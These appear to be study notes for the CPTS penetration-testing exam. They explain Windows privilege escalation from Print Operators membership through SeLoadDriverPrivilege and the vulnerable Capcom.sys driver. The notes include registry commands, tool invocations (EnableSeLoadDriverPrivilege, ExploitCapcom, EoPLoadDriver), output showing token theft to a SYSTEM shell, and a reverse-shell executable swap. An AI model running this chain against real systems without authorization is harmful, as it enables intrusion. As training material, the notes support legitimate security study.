This is a **high-value Windows privilege-escalation section** for CPTS. The central concept is:

> **Print Operators → `SeLoadDriverPrivilege` → load a vulnerable kernel driver → potential SYSTEM execution.**

The source also contains an important **Windows 10 1803+ limitation**, so don't memorize the technique as universally applicable.

---

## 1. What is the Print Operators group?

The **Print Operators** group is a highly privileged Windows group.

According to the section, its members can:

- Manage printers connected to a Domain Controller
    
- Create printers
    
- Share printers
    
- Delete printers
    
- Log on locally to a Domain Controller
    
- Shut down a Domain Controller
    
- Receive `SeLoadDriverPrivilege`
    

The privilege we're primarily interested in for privilege escalation is:

```text
SeLoadDriverPrivilege
```

This allows a user to **load and unload device drivers**.

The dangerous part is that kernel drivers execute with extremely high privileges.

---

# 2. The Privilege-Escalation Chain

The core attack chain is:

```text
Print Operators
       ↓
SeLoadDriverPrivilege
       ↓
Enable the privilege
       ↓
Load vulnerable driver
       ↓
Driver provides privileged functionality
       ↓
Exploit vulnerable driver
       ↓
SYSTEM
```

The example in the source uses:

```text
Capcom.sys
```

![Image](https://images.openai.com/static-rsc-4/cEq9Cu6wQav1bTOBnvQj-iFxI-6AgS5eVQokXszLLczf-dT9urRMXQJ6vW7KTIGxW2qnqExr0QB8nDNC2lrEd5lcVyhzdzIYZgYi1Ug1XWaElonhdbDg6r9HTpK27ytuBwnOs2ex3JBFNn-pEowclyQsP77DjPDNsfxMJUmb0nLiC0dl1DxmuJgQubH87tok?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ARZHzf-0JPoPvm8JW6aquBhaD8Y7zSTkY_vvC874SREa8sgtheKhU1HD-AJr4g8y2Cq4tIxn6lLukAKJ0Gbr84THPHeUSdlpdjhHrM86YeqS0bXZWKjQ63cDAoChzUajSy06k4FA2gJMy8YuVRX2yy-WaCdIwkhw5Yxbg2pjU3I0oS0K5CbqC0HlPNzPXGYY?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/htGjMEqDchnHToWUD-ZaqZocQ53Y752uMko2GDbU2nFt8O2ZilqkC8lub9rCIOKuX3Xwsnu-dSlvJZywW4HctnqXNmn6aJdphZy08HTF7zW5UtGjL4XLjSHBWqT_Jqo9kkUyi7AXrs029-osE3vkAOu4UgpLmzYE1dbSaK-BEjObwSh-9wEVpmgqZuoEXiWe?purpose=fullsize)

---

# 3. First: Check Current Privileges

Run:

```cmd
whoami /priv
```

The initial example shows:

```text
Privilege Name                State
===========================   =======
SeIncreaseQuotaPrivilege      Disabled
SeChangeNotifyPrivilege       Enabled
SeShutdownPrivilege           Disabled
```

Notice:

```text
SeLoadDriverPrivilege
```

is missing.

The source explains that if it isn't visible from an **unelevated context**, UAC may need to be bypassed before checking again.

---

# 4. UAC and Privilege Visibility

This is an important connection to your Windows Fundamentals notes.

You may have an account that belongs to a powerful group, but your current process could be running with a restricted/elevated token.

Conceptually:

```text
Powerful group membership
          ↓
User has privilege
          ↓
UAC / token filtering
          ↓
Current process may not expose it
```

After obtaining an appropriate elevated context, the source shows:

```cmd
whoami /priv
```

with:

```text
SeMachineAccountPrivilege     Disabled
SeLoadDriverPrivilege         Disabled
SeShutdownPrivilege           Disabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```

The important line is:

```text
SeLoadDriverPrivilege
```

---

# 5. Why `SeLoadDriverPrivilege` Is Dangerous

A Windows driver operates at the kernel level.

Therefore:

```text
Normal application
      ↓
User mode

Driver
      ↓
Kernel mode
```

A vulnerable kernel driver can potentially provide a path from:

```text
Low privilege
     ↓
Kernel-level primitive
     ↓
SYSTEM
```

The source uses **Capcom.sys** as the vulnerable driver.

---

# 6. Capcom.sys

The source describes `Capcom.sys` as a driver containing functionality that allows users to execute shellcode with SYSTEM privileges.

The lab therefore uses:

```text
Capcom.sys
```

as the vulnerable driver.

The important CPTS lesson isn't simply:

> "Use Capcom.sys."

Instead:

> **If you have `SeLoadDriverPrivilege`, investigate whether a vulnerable/suitable driver can be loaded and abused.**

---

# 7. Driver Registration

The source adds a registry reference under:

```text
HKCU\System\CurrentControlSet\CAPCOM
```

with:

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

and:

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

---

# 8. What is `\??\`?

The source specifically explains this unusual syntax:

```text
\??\
```

It is an **NT Object Path**.

So:

```text
\??\C:\Tools\Capcom.sys
```

is an NT-style object path that Windows can resolve to the driver file.

### CPTS takeaway

Don't confuse:

```text
C:\Tools\Capcom.sys
```

with:

```text
\??\C:\Tools\Capcom.sys
```

The latter is being used as an NT Object Manager path.

---

# 9. Verify Driver Isn't Already Loaded

The source uses Nirsoft's:

```text
DriverView.exe
```

Example:

```powershell
.\DriverView.exe /stext drivers.txt
```

Then:

```powershell
cat drivers.txt | Select-String -pattern Capcom
```

If nothing is returned, the driver isn't currently listed.

---

# 10. Enable `SeLoadDriverPrivilege`

The source uses:

```text
EnableSeLoadDriverPrivilege.exe
```

Running it produces:

```text
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
```

The key transition is:

```text
SeLoadDriverPrivilege
Disabled
     ↓
Enabled
```

This is a very important distinction.

### Remember:

```text
Assigned privilege
       ≠
Enabled privilege
```

This is exactly the same concept you encountered with `SeImpersonatePrivilege`, `SeDebugPrivilege`, and `SeTakeOwnershipPrivilege`.

---

# 11. Verify Capcom.sys

After loading the driver, the source checks again:

```powershell
.\DriverView.exe /stext drivers.txt
```

Then:

```powershell
cat drivers.txt | Select-String -pattern Capcom
```

Output:

```text
Driver Name : Capcom.sys
Filename    : C:\Tools\Capcom.sys
```

Now the chain is:

```text
SeLoadDriverPrivilege
        ↓
Enabled
        ↓
Capcom.sys loaded
```

---

# 12. ExploitCapcom

The source then uses:

```text
ExploitCapcom.exe
```

The example output shows:

```text
[*] Capcom.sys exploit
[*] Capcom.sys handle was obained
[*] Shellcode was placed
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

The important concept is **token stealing**.

Conceptually:

```text
Current process
      ↓
Exploit vulnerable driver
      ↓
Kernel-level access
      ↓
Manipulate/obtain privileged token
      ↓
SYSTEM process/token
      ↓
SYSTEM shell
```

---

# 13. GUI vs No-GUI Scenario

The source then discusses an important penetration-testing situation:

> What if you don't have GUI access?

The standard `ExploitCapcom` behavior launches:

```text
C:\Windows\system32\cmd.exe
```

The source shows the relevant function:

```c
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    ...
}
```

In a lab, the source says this can be changed to another executable.

For example:

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

The broader lesson is:

```text
Exploit
   ↓
SYSTEM execution
   ↓
What execution method is appropriate?
   ├── GUI shell
   ├── command execution
   └── other authorized payload
```

For CPTS, understand the **execution-context transition** rather than memorizing a particular reverse-shell payload.

---

# 14. Automating with EoPLoadDriver

The source also introduces:

```text
EoPLoadDriver
```

It can automate parts of the process, including:

```text
Enable SeLoadDriverPrivilege
        ↓
Create required registry configuration
        ↓
Call NTLoadDriver
        ↓
Load driver
```

Example:

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

The example output shows:

```text
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: ...
```

This is useful conceptually because it demonstrates that driver loading involves multiple Windows mechanisms:

```text
Privilege
+
Registry configuration
+
Driver loading API
```

---

# 15. Cleanup

The source demonstrates removing the registry configuration:

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

Then:

```text
Yes
```

to confirm.

The purpose is to remove the configuration created for the lab.

---

# ⚠️ 16. Extremely Important — Windows 10 Version 1803

This is probably the **most important exam detail** in this section.

The source states:

> Since **Windows 10 Version 1803**, `SeLoadDriverPrivilege` is not exploitable using this specific technique because references to registry keys under `HKEY_CURRENT_USER` can no longer be included in the required manner.

So don't memorize:

```text
Print Operators
   ↓
SeLoadDriverPrivilege
   ↓
Capcom.sys
   ↓
SYSTEM
```

as an unconditional technique.

Instead:

```text
Print Operators
       ↓
SeLoadDriverPrivilege
       ↓
Check Windows version / patch state
       ↓
Is this technique applicable?
       │
       ├── Older vulnerable environment → investigate
       │
       └── Windows 10 1803+ → this specific
           HKCU-based technique is not applicable
```

---

# 🧠 Compare the Built-in Groups You've Studied

You're building a really useful CPTS privilege-escalation map now:

|Group|Key thing to investigate|
|---|---|
|**Backup Operators**|`SeBackupPrivilege` / `SeRestorePrivilege`|
|**Event Log Readers**|Accessible event logs / sensitive information|
|**DnsAdmins**|DNS plugin → potential SYSTEM execution|
|**Hyper-V Administrators**|VM/VHDX access and virtualization layer|
|**Print Operators**|`SeLoadDriverPrivilege`|
|**Administrators**|Broad administrative privileges|

---

# 🔥 CPTS Must-Know

### Group

```text
Print Operators
```

### Privilege

```text
SeLoadDriverPrivilege
```

### Check privileges

```cmd
whoami /priv
```

### Vulnerable driver used in the source

```text
Capcom.sys
```

### Driver registration example

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

### Verify loaded drivers

```powershell
.\DriverView.exe /stext drivers.txt
```

```powershell
cat drivers.txt | Select-String -pattern Capcom
```

### Enable privilege

```text
EnableSeLoadDriverPrivilege.exe
```

### Exploitation tool from the source

```text
ExploitCapcom.exe
```

### Automation tool

```text
EoPLoadDriver.exe
```

### Cleanup

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

### Critical limitation

```text
Windows 10 Version 1803+
        ↓
This specific HKCU-based SeLoadDriverPrivilege
technique is no longer applicable
```

---

# 🎯 Final Mental Model

Think of **Print Operators** like this:

```text
                Print Operators
                       │
                       ▼
             SeLoadDriverPrivilege
                       │
                       ▼
                Enable privilege
                       │
                       ▼
                Load a driver
                       │
                       ▼
            Vulnerable driver?
                 /         \
               YES          NO
                │
                ▼
          Kernel primitive
                │
                ▼
        Privileged token
                │
                ▼
              SYSTEM
```

And the **CPTS golden rule**:

> **When you discover a privileged Windows group, don't just memorize the group's name. Identify the specific privilege it grants, determine whether that privilege is enabled, check the OS/build limitations, and then identify an applicable escalation path.**